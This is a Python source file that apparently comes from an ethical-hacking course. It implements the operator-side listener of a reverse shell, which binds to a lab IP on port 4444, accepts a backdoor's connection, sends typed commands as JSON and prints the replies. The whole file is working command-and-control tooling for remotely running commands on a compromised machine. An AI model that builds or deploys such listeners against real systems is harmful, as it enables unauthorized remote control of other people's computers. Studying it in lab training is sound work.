#!/usr/bin/env python
import socket
import json

class Listener:
    def __init__(self, ip, port):
        # Create socket and allow reuse of the port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        # Send data transformed into type byte for socket.send
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Initialize empty string to which segments will be added
        json_data = ""

        while True:
            try:
                # Convert received data from type byte to type string
                segment = self.connection.recv(1024).decode()  # FIX & WHY:
                # Concatenate each segment of data
                json_data += segment
                # Attempt to parse JSON. If it's not yet complete, ValueError is raised.
                return json.loads(json_data)
            except ValueError:
                # Continue receiving until entire JSON object arrives
                continue

    def execute_remotely(self, command):
        # Call reliable send to send serialized data
        self.reliable_send(command)
        # Close program if exit is specified
        if command[:4].lower() == 'exit':
            self.connection.close()
            exit()
        # Call reliable receive to receive response
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

# Start listener
my_listener = Listener("192.168.164.128", 4444)
my_listener.run()
